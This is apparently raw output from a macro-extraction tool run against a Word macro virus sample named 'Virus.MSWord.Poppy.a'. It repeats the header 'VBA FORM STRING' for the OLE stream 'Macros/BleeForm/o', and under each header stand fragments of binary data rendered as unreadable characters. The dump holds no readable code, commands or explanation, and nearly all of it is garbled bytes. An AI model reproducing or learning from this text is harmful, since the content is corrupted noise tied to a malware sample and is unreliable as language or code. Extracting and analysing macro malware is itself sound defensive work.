- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)�ȑj�e
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#�����$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�sK��R7+��Y'O8o������䃞}��
Jr
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~RA����㮧�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�.WKn�Bۭ�\�z�U=MTRS8�>#H�_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J��>3�N@8˔áM�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q*/*����~�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�̮I�?N��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��⍘���ﻮ֝�	&�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z��cn8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�	��Z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c`����꫍e
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��"[�]��jj!���$�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�%���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z.߆�v<UxZѲ�h�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z��[�֡��7�ϥnW:��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Y*^�D����2B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�2��P
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|���Hۧ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���zx���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����.�k����W}��[[��j(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^�Y��wL�̈г�b(�
�:{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z,�K��@�-�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{�|5���k���M�M�e�MY�R��YO`�Ck��Ȯ�i�f��D���(�7���J6�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ҳ�A�7*����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N���P�U�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Wu��JTH穥�`+#7��"8�y%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!i;��{ޕ��;�z�l�=Owk���Tj*����<���uP�)Q1�8��᜴hs�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����g5/���}ӿi+�m/�Krӗ���<,��'�'C嗎6!�ܢ��r;��4Nk$:�׃������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����m�{V������t4��\�t
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
bzƤ1ԭ5P���-��yL�۞5u+�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�b�T��/�9GKv�=��km?c��K��Ys��V�H+�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���?����,��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a�U��wK�zsIť��su
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���~MAAAo�T�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
74U�+b�\$u(�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Qx��I|�Q�⿹
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r������u��MQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�%�ȍ<̪N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��cy˚搘�H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h����7@޼=���c|��QTx�N��^�M����h�zP�5\oq�jt�%�1�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���(1��Q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z=}C���#`��٧���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P�\�p�U�٬�!GGR�T��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�\��D�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ӥ~s��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ڧ\͡���껡ӿ��j�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�H(E`���^Fv
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��#�1�o˒8��Q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n����oz5}�U��Z�ݩ�55\��t�!�*���H|�F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���?�r@A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4�
[�~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
| ���yR�
�K�K%M9&��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���DlFٕ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1�$e&g7x?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
۾�i�-]�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�k�ڱ��55��b��Rn�v�Z*�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����O*G��T�S�+0s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�8��gy5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� �Q\�:҇R���\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\ul�;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~";��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R��ҽ��Zf���Kk���Y��g��ꣴ�2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�dyPDjz
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���T��?�^��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1�w��ݩf�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����{L�i�}]�!Op�I|�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�x�xf����N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^]��2�U���v�]����5?틶�԰�J���5���|�?	K}rO==
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<�T/���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ǲ�/o]�ѝ�Y,uw�qݽ<l�k����=
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
MO�uIa�9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"4��,EK��c�.�����vM
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
m�&��˥���4͢GT����w�*��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
m�eyda"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`��9c�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e'�Jt�u�V~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R��.��n�ﵦ��UV}}����h犪�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��i�4�-$P�yS�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l���*�~uq�9�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{��;_S��EҟA�m���\ڭ�u�5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5�<V�ʤ���	�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!IA�<Q��rc��?ĕ=�ת��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e¦�r�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V
�}Es��M
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f�^���fR
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���bOM
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v��ך����U-U��p�i竞F/$�H䳻3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,ĒI$�җ7�#X�Zm�g���������t�ZwF�o�ͥїm;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
DZV���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
qҹJ���'r����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!ܮӬ=�?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�w6�d��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��V�Ѣjho��C�j������ТƵ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
41�f�j�+��ڊ#i\�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5CZx��)�{��Sw
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���4�a�ӗ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ƭ����>���M$�3@����!S����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���߉k7rk��f�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ium֑i.���VV%ƶ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Z��͑
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��D�|�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z�uW�老ވ�m��ߚ�Q~펢�t
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]/���%Em%��:d���Ur����i$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<[�Iw#Ʃ��wa�:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]�+6����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E��y�k��ʏ*i�?�J����M�K�6ȃ\x��]��+U����w�:��]��l��k_WKQ�E�7�,����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��$��֚��y6{L6�/�k��?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|�H|�>T)��ƸE�p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
zk�JV�ޥ&	�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�ޜc
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�>�z䌕}��y?�B�3�2g
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$�;]Xm�g��P
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Iݠ��O(��r�}�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�?Q�GC���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T���G�i�1��<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Ӯ+�zɧ����K�Xr1���y�Ϲ#'>�(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R�C[UL��d���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1X���1�ps�=O@�?�>�=4�!`�DR
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@����=~�v�{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
